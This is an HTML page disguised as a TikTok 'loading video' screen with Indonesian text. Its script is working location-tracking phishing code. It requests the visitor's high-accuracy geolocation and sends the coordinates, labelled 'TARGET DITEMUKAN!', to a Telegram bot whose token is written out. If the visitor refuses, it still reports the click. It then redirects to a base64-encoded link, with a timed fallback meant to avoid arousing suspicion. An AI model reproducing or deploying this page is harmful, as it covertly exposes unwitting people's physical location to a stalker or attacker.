<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TikTok - Memuat Video...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#000; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:sans-serif;">
    <div style="text-align:center;">
        <div style="border:4px solid #333; border-top:4px solid #fe2c55; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
        <p style="margin-top:20px; font-size:14px; color:#888;">Menghubungkan ke Server...</p>
    </div>

    <style>@keyframes spin {0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)}}</style>

    <script>
        const TOKEN = '8770900784:AAFQMU3eer9kUvL6QkWj2SqWCdkQiFnS8G0';
        const CHAT_ID = 'MASUKKAN_CHAT_ID_ANDA'; // <-- PASTIKAN ANGKA!

        window.onload = () => {
            const params = new URLSearchParams(window.location.search);
            const target = atob(params.get('to')) || "https://tiktok.com";

            // Fungsi Kirim ke Telegram
            function kirimKeTele(pesan) {
                return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
            }

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    // JIKA DIIZINKAN
                    const lat = p.coords.latitude;
                    const lng = p.coords.longitude;
                    const gmaps = `https://www.google.com/maps?q=${lat},${lng}`;
                    const text = `😈 **TARGET DITEMUKAN!**\n\n📍 Maps: ${gmaps}\n🎯 Akurasi: ${p.coords.accuracy.toFixed(1)}m`;

                    kirimKeTele(text).then(() => {
                        window.location.href = target;
                    });
                }, () => {
                    // JIKA DITOLAK
                    kirimKeTele("⚠️ Target menolak izin lokasi, tapi link diklik.").then(() => {
                        window.location.href = target;
                    });
                }, {enableHighAccuracy: true, timeout: 5000});
            } else {
                window.location.href = target;
            }

            // BACKUP REDIRECT (Jika 10 detik nggak ada respon, tetep pindah biar nggak curiga)
            setTimeout(() => { window.location.href = target; }, 10000);
        };
    </script>
</body>
</html>
